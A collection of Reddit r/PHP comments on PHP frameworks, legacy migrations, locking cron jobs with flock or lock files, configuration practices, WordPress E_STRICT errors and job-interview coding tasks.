Agreed - I made that rather clear in my post - also this reddit thread is specifically about this feature addition - so I was just being a good citizen and returning my discoveries I found... until, like you say - the documentation catches up (which is often the case). More worrying is my post above/below, which renders this feature pretty much useless anyway in 5.5.2: http://www.reddit.com/r/PHP/comments/1kiiu1/php_552_out_standout_feature_strict_sessions/cbpzxti
Actually... I have to disagree with this article. I think the problem is with the developers. I know, I probably won't make any friends saying that, but I still think it's true.
What packages do you use, or do you compile PHP on your own?
Interesting read. I wonder how things will be in the future with Symfony 2.x - I'm hopeful that because of the flexibility with composer dependencies it will mean that refactoring / migrating will be easier as you can work on a self contained component without impacting the entire project. 
There are many solutions on [Packagist](http://packagist.org) as already commented, and I totally agree with your point on *standalone* solutions. I am not confortable with **any** existing form solutions mainly because of two things: - No usage (or good compliance) of DOM API underneath the form component - Bad API: difficult to remember, bad re-usability and (sometimes) bad OO interfaces There is a *good* solution on **validation** though: [Respect/Validation](http://github.com/Respect/Validation). There are also [many](http://knpbundles.com/gpupo/RespectValidationBundle) [examples](https://github.com/diegoholiveira/samples/commit/24d171125ddf9db5f7ae036eb2f9773fbadbe350) [of](https://github.com/Meroje/laravel-respect) [it](http://help.slimframework.com/discussions/problems/4798-integration-with-respect-validation-engine) around the web you can see. PS: I would love to know what you will find as a solution for you, IMHO [Zend/Form](http://framework.zend.com/manual/2.2/en/modules/zend.form.intro.html) is a good one, but it falls under the point you and I pointed out already. :(
PHP is awful as a language, of that there's no doubting (there is no claim here, it is as much a fact as its popularity). But English is just as bad, breaking every rule and convention known and yet it's used for business and pleasure by millions every day. Until people start learning Esperanto, we can be happy to keep on speaking PHP.
you are not the first one with this problem and a step by step migration is possible and even documented: http://www.slideshare.net/fabrice.bernhard/modernisation-of-legacy-php-applications see also http://www.theodo.fr/blog/2013/06/sharing-session-between-symfony1-and-symfony2-using-memcache-2/
It's nice that you mention C++ and it's `operator bool()` conversion operator. I think it nicely highlights how something might sound nice in theory but end up as a real PITA in practice. Before C++11, i.e. before the introduction of `explicit` conversion operators, using `operator bool()` was usually a rather bad idea because it would also allow indirect casts via the bool type (e.g. `int foo = castable_to_bool`). Instead you had to use some fairly sophisticated trickery called the Safe Bool Idiom. C++11 resolved this issue by introducing explicit conversion operators via the concept of implicit and contextual type conversions. Now just imagine trying to add this kind of mess to PHP and keep things somewhat consistent ;) Anyway, even apart from this I see little use in additional magic methods for type conversions. See in particular: http://markmail.org/message/qdooshjbeb3xn3p5
I've been worried that this is our inevitable future now that CodeIgniter no longer has a project owner. I'm not sure what will happen with CI, but hopefully we can figure out a way to mitigate such a scenario if it were to crop up. My one idea that came up is the possibility of using dual frameworks, and essentially signifying at the controller level which framework should be used to drive that page. Then all new functionality could make use of a modern framework, and older controllers can be migrated on a one-by-one basis. The one downside is we would essentially have to re-write the bulk of our models and libraries as well, as well as possibly having to maintain both sets for an indefinite period of time. This would also take some manual tweaking of library configurations (which is obviously not ideal), but if we run into the same scenario as this article, it's the only viable solution that I can think of that would possibly get us out. 
Before `explicit` the safe way was to overload the `!` with `bool operator !`. Nothing else worked as expected... as conflicts with other type casts would appear. So you had to `if(!!...)` :)
Haha, no. That's my salary.
In my experience you should only put things that take awhile to fetch in the session, to obviously avoid re-fetching them on every page. Mostly I find myself using it for third party APIs that are slow. I rarely put stuff in the session that I have access in the database. If loading your client information from a database takes too much time then you are probably doing something wrong. Optimize your queries, section out your site and only load the minimum of what you require for each section, etc... 
I came here to post this. I did a migration of a saas app from some fairly terrible spaghetti code to symfony2. The whole process was easier than I anticipated. About 160 man hours to turn ~20,000 lines of pain in to about 13,000 lines of MVC joy.
A working application is a working application. If you want to change, make v2 a rewrite, but there is no point switching your project from CI to some other FW based on politics and rumors. CodeIgniter is still getting active attention from the community in the form of bug fixes and pull requests. EllisLab are still releasing security fixes, and will continue to do so until somebody else takes over. What happens then is anyones guess, but it means that CI will be maintained. I am doing this for PyroCMS because I have literally no choice, a rewrite would kill of our users, but if this is a company project you are not in the same boat at all. Deprecating core CI code and using Composer packages makes this job a lot easier, but I really have to stress that you shouldn't be trying to do it.
Build new apps with whatever FW you like. Leave old apps alone.
Replace the word "framework" with "dependency" and you're describing a problem that has been around for decades. If you rely on third-party code, that code will change. If you don't keep up with change, you need to spend a LOT of time working on things. Don't bash on frameworks just because this difficult set of mostly political and business-driven reasons caused them to get stuck in a really shitty position, because that doesn't make any sense. Also in programming terms, if something lasts for almost a decade it is not a "trend". Web development frameworks have been helping developers get shit done for most of the new millenium.
In the java community, there is a concept of "Application Servers" which bundle everything that an enterprise could need for an enterprise application such as a web server, messaging, job server, caching, continuous integration etc and connectors for various data stores such as a relational database. It's basically a one stop shop for managing your application instead of setting up and choosing the individual components yourself. In the PHP world this may be Nginx, php-fpm, gearman, memcached, rabbitmq and mysql. Basically Zend is trying to introduce the concept of a PHP application server to replicate the lucrative incomes that companies such as red hat gets for JBoss which includes yearly licence fees as well as training. I'm not saying this is good or bad, however I prefer to set up servers in my own way and with automation tools such as puppet, I don't see any benefits from using Zend Server. However for some people, it is a very convenient product.
I agree with phil here, if you are going use and get the benefits from third party code, you need to stay up to date and be up front with the stake holders in your company about allocating resources in the future to deal with this before you commit to using it. After all you do save countless hours initially by using that third party code. You would have to same problems in regards to training new hires if you used your own internal framework and I highly doubt anyones internal framework or toolset is as well documented as a community driven one. In regards to office politics, this is where you need to have a member of your team who can speak on the level of the average stake holder. That person needs to be able to communicate the business value that a planned upgrade path brings in a language they understand. For example you would say things like: Being up to date allows us to hire quality people more easily, as they can use the tools that are industry standard now, we would also have to spend less time on training these new hires as documentation is more freely available - this will save us money. Or We are using legacy code with vulnerabilities, our customer data is threatened and if we don't upgrade soon, we could have a major incident that harms our reputation - this will save us money. The way this argument is framed has nothing to do with technology at all, most of the business people you work with look at a big picture, not what you look at, communicate with them on their level and I doubt you will have problems. They could be looking at the choice to upgrade or not based on arguments like: ABC is old, XYZ is newer, we want to use XYZ it's better, let's spend the money to do it. Or PHP 5.2 is old, we want to use PHP 5.4, it has [] notation for arrays, let's spend the money to do it. No business person is going to bite at this, leave the technical jargon at the door and communicate in terms of benefits to the business. I've never had trouble pushing through changes like this in my work with this approach.
From the page: "Today’s blog will show you how to avoid your PHP script being executed twice, by using a “pid” file. It also shows how to handle signals (like Ctrl-C key presses) gracefully. It explains how you can define a signal handler that can execute some “clean up” calls."
Thanks! I will be looking into that.
Fair enough. I see a lot of people talking about porting their apps from CI -&gt; L4 and while I understand the reasoning its a really bad idea. I try to warn people when it looks like they're doing it, especially in public - so others won't think its a good idea.
In general, don't mix configuration and the code that depends on it. That being said, configuration comes in a lot of different forms, and which form you're talking about makes a *big* difference. **Developer-configurable**: config file (e.g. MVC routes) **Environment-based**: config file (e.g. paths) **User-supplied**: database (e.g. user preferences) **Package-level**: class constants ("configurable" only in the sense that the values can feasibly change, probably not often, but should be easy to locate) *Edit: I should add that, under no practical circumstance, should you ever "hard-code" configurable values.*
Thanks! I've been looking and trying to sum this up and you have quite well.
Totally agreed. I use a framework when i expect something to not live longer than, say, 2 years. For "enterprisy" things which are supposed to last much longer, i stay away from frameworks as far as possible.
75k, NYC, 5 years experience. Started at $24k, moved to $35k then $42k within 9 months of that first job. Was pirated to an EDU where I was upped to $52k, stayed there for almost 4 years, and am now a back end engineer for a logistics company at $75k. Had I not stayed at the EDU for those 4 years, I would probably be in the $100k range now. I'm a generalist with a focus in PHP (ie, I can code in Java, C++, HTML, CSS, SQL, JS, Python - can manage and set up server farms / clouds, and everything in between)
You could use a lock file. Create the file when the script starts, delete it as it exits. If the file exists, exit immediately since another instance of the script is already running. 
implement a lock system, so that if the "file.lock" exists, the script wont run, before that file is deleted. - script file starts - checks for lock file, does it exist? then die - if not, make it - run normal operations - delete lock file
What happens if the script crashes or does not get to finish? The file would not get deleted and then the script would never run again until manual intervention.
http://php.net/manual/en/function.register-shutdown-function.php This is also a way to make sure the file is deleted, even on a crash.
http://www.php.net/manual/en/function.flock.php You can open the file with fopen and then use flock to lock in LOCK_EX mode. You unlock when you are done. If your script crashes, the lock will be released (the file will exist, but it will no longer be locked by another process). flock will block until the lock is released, or you can bypass that with LOCK_NB.
&gt; The file would not get deleted and then the script would never run again until manual intervention. This is desirable in many cases. If you've got a faulty you frequently don't want it to keep running if it's not working. You want to be notified and fix the issue. A couple of options: * Check the timestamp of the file (or write a timestamp to the file, and then read it) If you know that your script won't run for more than 10 minutes you can break the lock (delete the lockfile) if it's older than 10 minutes. If there's no upper bounds to how long your script can really run, then the timestamp method won't work. You can also do something like print a message if the lock file is 10 minutes old. If cron is configured to email cronjob output then you'd be notified when this happened. * Write a PID to the lock file. If there is no process with that PID then it must've crashed and you can break the lock. The PID method runs a small risk that by the time your 2nd instance starts the PIDs will have cycled again and some non-cron script will have grabbed the PID the cron job had last time. * Convert your PHP cron job into a daemon. Then you can have it run 5 minutes after completion every time. At work we have a job which runs every minute. There's a 5 minute max age on the lock file, and if the lockfile gets to be older than 5 minutes an error message is printed. Cron emails me any output so I fix the issue. It's been working well for us for about 6 months now. 
Something like this? &lt;?php $fp = fopen("/tmp/lock.txt", "r+"); if (flock($fp, LOCK_EX | LOCK_NB)) { require_once /cron/cronjob.php; flock($fp, LOCK_UN); } fclose($fp); ?&gt;
What I found while browsing around were basically two approaches to handling forms. 1. Treat forms as an html level problem and provide view helpers to prevent the mundane html typing, and easy smashing of arrays into html attributes. 2. Treat the Form elements as objects and provide a class for each element type. I tried to use Symfony's Form Component but I could not get it to render - I've never built with Symfony so a lot of the bootstrap concepts I had no idea what it was and the examples in their docs are strictly for a Symfony app. I considered using Phalcon's Form classes even though they aren't documented as standalone. However, the lack of being able to review the underlying code if I had problems (since it's written in C) scared me away. I finally settled on zf2's Zend/Form. * the creation of forms and elements made sense to me * hard coded form classes or dynamic creation from an array was a requirement and that looks to all be there The hard part to get a demo up and running was the rendering portion. It took a bit of hand holding. In regards to standalone and composer: I started with using zendframework/zend-form but it couldn't get anywhere without zendframework/zend-servicemanager. Then I tried to do rendering and it needed zendframework/zend-i18n for labels and zendframework/zend-view plus zendframework/zend-escaper. This was enough to get it working, but another thing I wanted is CSRF - there is a CSFR element but it needed zendframework/zend-math and zendframework/zend-session. It wasn't as standalone as I'd like, but if I wanted to handle rendering and csrf on my own I could get by with just zend-form and zend-servicemanager. Zend/Form also has a lot of the html5 element built out and their total number of elements is the most comprehensive I found. Respect/Validation looks promising, especially since it has hooks to use ZF code. 
Pretty much. "w+" might be better because I'm not sure r+ will create the file if it does not exist. "c" or "c+" might be best according to http://www.php.net/manual/en/function.fopen.php I've done something like this in the past, but ended up using a database lock to allow the cron to sync across servers (for a very particular use-case).
Thank you, this was the method I used and it works.
Thank you for the detailed response. I went with somethinghorrible's method as it was quite simple to implement.
Hmm.. read this about blaming programming languages: http://jonisalonen.com/2012/blaming-the-tool/
ouch man... =(
How do you output variables in your templates, or return the rendered templates to the browser?
To answer your first question, yes, I do. I think with PHP 5.5, Opcache (or APC, I actually see better results with APC even if it has been discontinued), you can create a pretty lean API. Especially if you throw in heavy caching and throwing as much work into background workers (if needed). If you want API actions to be in the 10-20ms range, a full fledged framework (of any language) is probably not right for you. In that case, handling everything yourself (and possibly not even using PHP) is the best course of action. I think Symfony can easily handle an API that gets a few million hits per day. Additionally, the piece that might cause the biggest bottleneck in that equation is Doctrine. If you're talking Twitter/Facebook/Netflix, etc numbers, Symfony (and PHP) is definitely not the way to go. Thanks for the support, I really know this book is going to be awesome.
Use APC, add a memory variable that can be read by all instances of any scripts.
The *comparison* function returns 0 (they are the same), -1 (the left is larger), 1 (the right is larger). Then the *sorting algorithm* (in PHP this is all *quicksort*) takes the actions that are appropriate for that comparison condition on its own. In the case of [quicksort](http://en.wikipedia.org/wiki/Quicksort), this means that in the case of 0 or -1, it ends up in the "left" bucket, and in the case of 1 it ends up in the "right" bucket. The actual sorting algorithm is not something you can configure in PHP. Quicksort is not slow, but it isn't the fastest sort for certain applications. RADIX sort can be faster sometimes for instance, but quicksort tends to be more generally applicable. EDIT: As a quick example, if you were to provide a custom comparison algorithm that always returned 0, it would (should) step through once and not change the order at all.
&gt;2 Dimensional Discrete Fourier Transform on images using just GD library I actually recently encountered a problem where I needed to use this kind of math on audio to create a waveform image. My problem wasn't so much that the math was unavailable, but that PHP doesn't really have any good ways for me to access the audio information itself. Ended up using Python.
I would at least check out the PSR's that have been published by [PHP Framework Interop Group](http://www.php-fig.org/). And I would also consider Silex as an intermediary between nothing and Symfony-like development.
To be fair, if you store the relevant data in sessions, you are *still* accessing it every page load off the hard drive in the files that PHP stores the session info in. The largest performance hit on this is in the location and spinning of the disk to the correct sectors however, which must be done for single ID's and larger sets of data, so it usually provides some performance improvements to put this kind of data in session variables. Saying that session information is only accessed once while databases are accessed every load is not a good representation of reality though. Sessions don't magically remove the need to make a process aware of its context. The only situation I can imagine where it would be a clearly less performant decision to put information in sessions is if you had the relevant user ID in a cookie, but that presents ginormously unmanageable security issues, and so it never really comes up.
&gt;If you're talking Twitter/Facebook/Netflix, etc numbers, Symfony (and PHP) is definitely not the way to go. There are ways to mitigate that sort of thing. - You can go the Facebook route and write your own PHP compiler (a la HipHop) - You can custom-build your framework (which of course presents different problems with maintainability, security and stability) - You can scale the hardware using services like AWS (which powers Reddit, BTW) - You can use purpose-built infrastructure in something like Go It really depends on what is more valuable to you: being able to access the developer pool of PHP or not having to address these kinds of problems. You absolutely can create applications at that scale using PHP, and likely you can even using Symfony. It depends entirely on what sorts of rabbit holes you're willing to jump down, and what sorts of tradeoffs your project/company values. There are definitely situations where it makes *more* sense to use HipHop or create your own PHP compiler by hiring 2-4 talented C devs and thus allow your *application development* to have access to the large pool of PHP developers and well-tested solutions.
Although the flock answer is already given this post may help you: http://www.reddit.com/r/PHP/comments/1koa32/catching_signals_in_php_scripts/ or http://www.leaseweblabs.com/2013/08/catching-signals-in-php-scripts/
Use a semaphore. http://en.wikipedia.org/wiki/Semaphore_(programming)
Hope that's workin out for ya.
At least you're not using Fusebox. I always hate when I have to dig into our in-house CRM.
This looks like a nice project. Are there any preview chapters available?
You have your reporting turned to E_STRICT in the php.ini WordPress as an application is not very well coded at all (and the plugins tend to be even less so), and so what you're seeing is all the places that the plugin is violating E_STRICT rules. PHP knows what you "mean" when you do stuff like this most of the time, but when you have E_STRICT on it will stop the script and scream about it, because that's what the setting does. Turn off E_STRICT in the php.ini and the site should function as before. Optionally, you *could* go through and fix all the errors and resubmit the plugin.
Thank you! I'm working on getting the first preview chapter up right now. If you do go ahead with the pre-sale, one thing you get is the software that powers the site. It's a small Symfony application but it gives you an idea of how I set up my apps. Additionally, you can use it to set up a single page site to sell your own product. There's also a newsletter signup on the site, if you don't want to do the pre-sale you can sign up for the newsletter and I'll let you know when a sample chapter is ready.
Thanks for the suggestions. I will try some of that books and sites.
&gt; WordPress as an application is not very well coded at all (and the plugins tend to be even less so). ^ this is enough of an answer :)
Your previous server most likely had error logging set differently in the php.ini and possibly a different version of php altogether. Your best bet is to get E_STRICT turned off for the site, at least as far as what reports to the screen, but be sure to keep logging all errors somewhere behind the scenes. You can probably also turn off E_STRICT errors somewhere in the app or using .htaccess, if you don't have the ability to modify the php.ini. [Here is a recent forum discussion](http://wordpress.org/support/topic/strict-standards-error-at-html_outputphp) on the Wordpress forum that seems to relate to your issue. 
Well, not really because it doesn't at all tell him how to resolve the problem, only what the source is. But I get what you're saying. I've seen some monstrosities written in WP in my day...
You really shouldn't. Just conform your application to the [PHP Framework Interop Group PSR's](http://www.php-fig.org/) and then using a framework like Silex, Laravel, Symfony, etc. will leave your application portable enough to move your "enterprizy" code as necessary.
This is a correct way to do it. There are a lot of other bad suggestions in this thread which contain race conditions. Things like simply checking for the existence of a file will work most of the time but can allow both scripts to run simultaneously anyways. flock() can be relied on to only allow one script to hold the lock at once.
Thank you for the speedy reply! You've saved me a headache, have some upvotes! :D 
A lockfile would work, but I do this. It works pretty good. $check_process = shell_exec("ps aux | grep [f]ile_name.php"); $num_occurences = substr_count($check_process, "file_name.php"); if($num_occurences &gt; 2) { die("Process is running already"); }
This has to be the worst argument I have ever heard about frameworks, I currently work on a 5 year old, framework less codebase that is probably north of 300k lines of code. Very "enterprisy" to say the least... Its an absolute train wreck, dependencies are impossible to track and the entire project suffers from fix 1 bug, introduce 3 more. Even basic routing would eliminate so many issues. Then theres our autoloader that was home built and has caused so many head aches recently. Furthermore there is inline SQL (some places PDO, some MySQLi, some good ole mysql....), some places have ViewModels which is nice, other places are just passing massive arrays around, its impossible to know what data you have to work with at any point in time. We have a homebuilt ajax-&gt;php interface that we recently discovered had a huge exploit and in general doesn't provide all the functionality we desire. I could drone on about it, but even the most basic framework is better than nothing at all.
/u/drrcknlsn has it right about the different types of configuration. For my money the answer to this also depends on your project scope and audience. Ask **first** whether the value is ever likely to change. If the client says it's not going to change, take them at face value; it won't change. If they say it might change, it still probably won't change. **Then** ask yourself how easy it is to change the value. Is it one call to a getConfig method instead of a hardcoded 4? You can probably do that (and certainly should: no magic numbers is a good thing, use at least class constants). However, if it means you have to change the structure of your code, don't do that unless it's in the written scope. Good code is more important than being able to change something that "might" change in future but probably won't.
We've been able to hit ~15 ms API hits with redis/Yii Framework and Decent hardware (reported from new-relic). We get several million page hits a month. If you spend some time and write some reverse key indices, you can get some decent text searches in redis. I've been able to get ~6 to 10x faster response times than SOLR with ~250k documents loaded (this will vary greatly depending on how much your indexing). Yii is pretty fast for a php MVC, using Redis instead of mysql with Yii can def get you really good performance. 
Keep your DB stuff in your Models, the bulk of your code in controllers, and echos only in views. We use Yii Framework and custom Composer Projects (between our webapp and our mobile app). Yii provides a lot of flexibility but also be ready to open up the framework and start modding it if necessary. Some nice things that help organize things is like a global PHP class/file that holds all your constants. If you have a Key-Value store like Redis, we keep our Redis Key patterns in there too. It really depends on your Startup business but being an e-commerce site, IPs aren't really something we are big on. Bottom line is traffic/revenue, IPs are icing on the cake. Move fast, get conversions. I don't really know what else to say. Its not like we enforce camelcase vs underscoring variable names, we just have great programmers that move quickly while taking pride in their work.
If you had a valid counterpoint, you would have provided it
If your script is simply "find some stuff that needs doing and do it", a job queue might be a better approach to dealing with that work. If it's a script that needs to run exactly every 5 minutes or whatever, cron is the better solution and you should investigate lock files or long-running daemon with an internal timer.
We host several 1.5.26 sites that we are dragging along because clients won't pay to have them updated. Code gets injected on a regular basis most of the time to send spam. I think that the codebase for that version is so full of holes that it would be impossible to adequately lock it down. We no longer build Joomla sites because of the security issues.
&gt; flock will block until the lock is released This week, on Dr. Seuss learns PHP...
I love supporting things like this, but $45 is a bit steep. Once you get a preview chapter up I'll take another look! It does look like you have a lot of content, but the last PHP book like this I pre-ordered never really met my expectations. 
We use memcached for this sort of thing. Since our setup is on AWS and we could have multiple servers running, having a centralized place to store the lock means that the servers won't all execute the same thing. You can also set an expiration time on memcached, so you don't have to worry about checking timestamps or anything like that.
**"There are only two kinds of languages: the ones people complain about and the ones nobody uses"** - *Bjarne Stroustrup, father of C++*
Sorry to hear that. I think the content + the final application you'll be building along the way will be well worth it. Additionally with the pre-sale I'm giving away an hour of consulting time and the software behind the site itself, which I think adds a good value as well. At any rate, sign up for the newsletter to learn about updates to the book or check back. Thanks!
You, sir, should get gold for this. But I'm a cheapskate, so you just get an upvote. Here's why: &gt; As someone who can write his own router, and someone who at some level has dealt with hiring and recruiting most of his career, here is some advice on this. You've proven your authority on the subject, meaning I'll be willing to listen to you. &gt; Your confusing "pure php" with "programming." I could care less if someone can write pure PHP. You're hitting me where it hurts. &gt; &gt; that I don't create on my own" &gt; That's awesome! And I think it's something every PHP programmer does at least once. =) You aren't telling me that what I'm doing is the devil. Of the arbitrarily-large number of people on reddit who have told me to "Use a framework", you are the one I'm most likely to listen to. I'm not a fan of groupthink. Just because a large group of people say "Use this framework" doesn't mean it's good - just popular. So, thank you for well-reasoned arguments, and for realizing that this is something I am going to do. And to all the other devs out there who tried to convince me: learn from /u/jasonlotito!
It's also a poor example because if you want your object to behave like an Array you implement the ArrayInterface.
I was wondering if you might tell me using if .ini files is good practice. I see xml and more yaml being used but not a lot of examples (that I've seen recently) using the .ini layout
Choice of framework is not as important as some people make it out to be. Nothing is going to automatically generate what you are trying to build, so just look for one that will provide you the tools / setting to build something. A lot of that will come down to personal preference and what you feel comfortable with. For me, I'd choose Symfony 2, but that's because I like it and it has a great community.
Don't really need a framework for this, you could start with a crud script and you could pull some components out of Symphony like for routing and templating. Only use the tools you need otherwise you're going to be loading a huge framework and only really using parts of it.
HHVM is really slick. Ive seen some fast load times from other devs, 3-4x of what apache/nginx is capable of with currently no cache used and unoptimized db. 
I would use a tiny framework to handle the MVC and routing, and a library of classes that I can add as needed, to handle things like messages, sessions, authentication, logging, files import/export, etc, and for database simply use PDO. Performance is going to be important... The choice of framework can be good but it can also become a problem when things start getting big. It all depends on your experience with such type of projects and the framework you chose. I would never start a new big project with an unknown framework, but doing the things the way I know that will work as expected. Getting things working when we don't understand how they are handled by the frameworks, can result in unexpected problems. A framework can save some time, but honestly, after 15 years using PHP in all kinds of projects, it never made a big difference for me. The time saved implementing is often spent with learning, unless we stick only to one framework, it will save time in the long run. But imo it is a bad thing since there's no such a thing as perfect framework for everything. And best advice I could get: Don't spend time digging into frameworks trying to find the perfect one for your project. Just start coding. My 2 cents.
 header("Content-type: image/jpeg"); readfile('image.jpg'); That's pretty much it. You can get the user agent and other stuff by using the $_SERVER variable. Note that many e-mail clients will block image loading by default.
In the email just do an &amp;lt;img src="YOUR SCRIPT URL HERE" /&gt; then either redirect it to an image, or use php to draw an image, or really just do this with a 1px square tiny img that isn't meant to be seen. Tracking pixels are standard fare. What's your application?
Uhm, a framework is a black box. You never, ever edit the frameworks code. if you do, you doomed yourself. A framework is a darn complex application, and you as a single developer are not able to track EVERY change which comes with an update, because the framework updates are made by a team. Zend has a buttload of people on ZF. And just because some custom frameworks are old and shit, this is no argument against writing your own system tailored to your needs. It's essentially the same kind of argument which the php hating faction uses. "PHP is bad because there is a lot bad code written in PHP". A good custom framework will always exceed every "generalist" framework on the market, same as a custom tailored suit will always be better than a suit from a clothing store. And after all, it's a matter of responsibility too. You give away responsibility to Zend. So every bug Zend does will be your bug. You will be responsible for it, buisness persons mostly don't care where bugs come from, they only care that they are fixed. And they don't respond to arguments like "oh we have to refactor our compontents because we need to upgrade zend from 1.5 to 1.6 (made up numbers) because this update fixes this bug".
Like i said above: "PHP is bad because there is bad code in it". &lt;- same argument, bad argument. Just because people write bad frameworks, this doesn't mean custom frameworks or internal frameworks are worse than the open source ones. A good custom framework is better than every framework on the market, because it's tailored to your needs. If the developers are bad, nothing will help, not even a open source framework. But yes, if you have inexperienced devs, a framework can help to maintain a healthy codebase against all odds.
Joomla 1.x branch has had numerous security fixes since 1.5 so those client applications will be riddled with known problems. 1.7's first incremental release had 3 or 4 vulnerabilities fixed all by itself. See http://developer.joomla.org/security.html for all disclosures from 2013 back. It's possible, maybe, to patch incrementally but that's going to be more expensive than just upgrading...
I think I wasn't clear. My point is that any good framework is a collection of independently useful libraries that work nicely together. I don't like magic. If you adopt a framework that is a bunch of collaborative libraries, all with well-defined APIs, then you're golden. The idea that anyone would feel the need to upgrade from SuperFramework 1.0 to SuperFramework 1.3 just because 1.3 is out now baffles me. If the original authors abandon the fork you're on, well, that sucks. But not using free stuff with a complete test suite that's available today, just because somebody might stop doing your homework for you in the future is dumb. Read the source, luke. EDIT: My point is, I don't like frameworks that pretend to be "product". If you're approaching a framework, you should look at it like a pile of code. You shouldn't make any changes if you anticipate better changes coming down the line. But you should read the code, grok it, and use it for your own advantage. This is why I don't like things like Rails, or Cake, or, basically, any framework that provides an opnionated "Model". The "Model" bit of MVC is, 9/10 times, the core of "your job" 
Don't think to hard about this. If you are going to release the application ot the public, don't hard code. If it's for your specific purpose, hard code the fuck out of it, why spend the extra time getting around it?
As has been said any of these frameworks should work fine. I would recommend using Doctrine 2 and Symfony in Zend (1 or 2). All of these things have great user support and integration of doctrine with zend is well established. You'll find user account model templates in abundance or it's very easy to roll your own. With regard to whether you should use a framework or not I would say yes. 6 months down the line when you want to add functionality or change something, it makes it 10 times easier as you will have always coded to a certain convention. Doctrine is great because it abstracts your data from the database. Instead of database entries you just have entities that you can work with and it's easy to make lifecycle callbacks and attached functionality to your entity models. It also makes it super duper easy later on if you want to change database technologies. Not only this, but it can also reduce the amount of queries sent to the database as it intelligently handles transactions and whatnot as well as helping to protect you from injection attacks as it properly escapes all queries when you're using doctrine's functionalities. TL;DR Zend will really help with the development with the website and Doctrine will change the way you think about databases. Both provide an excellent level of abstraction that makes software development really easy.
p.s take a look at Magento. Magento is written in Zend and includes inventory management as part of it's e-commerce package.
Cute, but unless I really liked the company or was in an area with few web dev jobs, I wouldn't bother. This is also why I have code on github, so I don't have to waste time on projects like this when applying for a job.
I agree. This is also why I've put the whole thing up on Github for future reference. But the task seemed interesting enough to give it a go - I had been interested in this type of text based game since I was a kid, so I found it a very refreshing task.
if the rules say that it's suppose to work the same / look the same for cgi and cli, the &lt;br&gt; for linebreaks wouldnt work well for CLI.
Of course, that's why there's two loggers in the final code - a CLI logger and a CGI logger. The CLI one uses color coded terminal output and end of line symbols to terminate statements.
Refreshing, indeed. And obviously fun. Good call on using it as a resume piece.
This is maybe more suitable for /r/webdev, even if it comes from "thePHP.cc" guys. (I've seen them at several conferences. Sebastian Bergmann is the author of PHPUnit and a major PHP contributor.)
I guess you got the job
I got an offer. I didn't take it though.
Exactly. Just as you would choose Symfony, I would choose something totally different, based on my knowledge and needs of my project. For me the best framework is always the one that you know best, and when you know it well enough to know its limitations and you see that the limitations of the framework will be desctructive in making a new project, you know it's time to learn something new.
Good comment, +1. 8 Years of working with frameworks like symfony 1 and 2, Zend 1 and 2, EZComponents, ZetaComponents, CodeIgnitor, etc. The best framework is the hybrid you create from different tools. The one I am most familiar with as a base framework is EZComponents, then I hybrid ZF2 and Twig in for better autoloading,validation,xmlrpc server and clients, etc(Zend) and Templating(Twig). This provides the best performance and development speed for me, while keeping to the standards and quality.
&gt; You, sir, should get gold for this. I'm a charter member. =) &gt; Just because a large group of people say "Use this framework" doesn't mean it's good - just popular. Just to be clear, and that their is no misunderstanding: you should learn a Framework. Hell, you should learn Frameworks. One for writing PHP web apps, another for writing iOS Apps (CocoaTouch), another for writing Android apps, etc. Point is, use existing tools. Of course, that doesn't mean you should explore outside those tools. Know how to write your own router. Know why you shouldn't have to bother.
I suppose it helps if I start to read the article. I'm such a dumbass sometimes. Literally like the third sentence and I understood. haha
You did all this during a job interview?
From personal experience, having a large product means you have a lot of technical debt. Let me equate this to a project I've worked on that stuck with Laravel 3 (and Laravel 4 changed EVERYTHING). It means that: * any plugin you relied on (in L3, it was a "bundle") will break. If it's not ported over to work exactly like before, you're having to go through tons of code to reimplement the same feature. * any major overhauls in behavior will kill you in terms of time taken to change things. At the peak of my app, my route.php file had over 3000 lines (I used routing with closures), perhaps more. I'd have to refactor each and every one of those routes to work with L4 due to the new structure. * custom library implementations may break as well. This means, again, reimplementing features that should have already been there. There are many other differences but I see those as crucial. They could easily add a couple of weeks to debugging. And that's mainly because Laravel's Eloquent implementation (which my app heavily depended on) didn't really change much. If L4 decided that they knew a better way of doing an ORM and started from scratch, well, I might as well start from scratch as well. Now, I can't even imagine such a move if my app had been bigger, if it was MORE dependent on Laravel (I wrote a lot of custom stuff that can be ported to other frameworks), and if I had stuck to the original release of L3 as well as its bundles. With Symfony, it's the same thing. The larger your project is, the more likely it is that it will break. Where I currently work, we use Symfony 2.1 and porting to 2.2 took our dev several days and we're still not comfortable doing this (actually, we decided to start completely over).
Why did you make these? CodeSniffer already has them built in... https://github.com/squizlabs/PHP_CodeSniffer/blob/master/CodeSniffer/Standards/PSR2/ruleset.xml
No it was a "do it and get back to us" type of task
I was once asked to do one of those, it was a solver for a common board game. Honestly these kinds of tasks sound more like they want free work out of you. Would have taken 3-4 days of work to finish it too, so I passed.
so the company is in need of a programmer who doesnt need soecifications/requirements?
Not sure what you are aking for here. If you want to know if you can replace a PHP page with an HTML page, then, yes, you can do this; however, it will not have the functionality that the original PHP page may have had. As for your second question, if you have the username/password for the account, then you can, pretty much, do what you want.
&gt; or add some asinine functionality to their already buggy and rusty Drupal/Wordpress website. That doesn't sound like an interview. That sounds like a sneaky way of getting some work done for free.
That's what these types of interviews usually are, yeah. Hence my liking of this task - especially seeing as they mentioned beforehand that they don't intend to use what I build for anything whatsoever.
Way to think inside the box. The company is need of a developer who can demonstrate his own approach to problem solving and planning.
you could use PHP_EOL
I couldn't even be bothered to read let alone contemplate doing it. I'd walk out if someone asked me to do that. I'm not desperate and I think anyone else with equal skills wouldn't be that desperate either. They would be thinking - do I want to work for this person?
Which is what the CLI logger uses, yes.
Ok, the lack of mention of this made it seem like you just didn't know the other existed. :) The "core" CodeSniffer ruleset grinds my gears. There have been multiple conversations with the Squiz team about them enforcing rules that are not actually in PSR-2 itself, and you've named the main one: $exists = $this-&gt;_coll-&gt;exists(function($k, $e) { return $e == "other"; }); This is just a random line from Doctrine which flags up as incorrect with "Each PHP Statement must be on its own line". Or this in Guzzle: $mapped = $this-&gt;coll-&gt;map(function($key, $value) { return $value * $value; }); CodeSniffer would prefer you do this: $mapped = $this-&gt;coll-&gt;map( function ($key, $value) { return $value * $value; } ); If you rules won't bark at me for using valid PSR-2 syntax, then I'll be happy to use em.
What do you expect from programming job interviews? I'd sooner walk out of an interview that asks me to explain something as pointless (in PHP) as the big O of a specific sorting algorithm than making something actually tangible that can demonstrate skill and good coding habits.
Although I say "yours"... is this really yours? It looks like a fork with two trivial changes made. Why are you posting your fork and not just submitting a pull request?
I think you accidentally the 2nd step
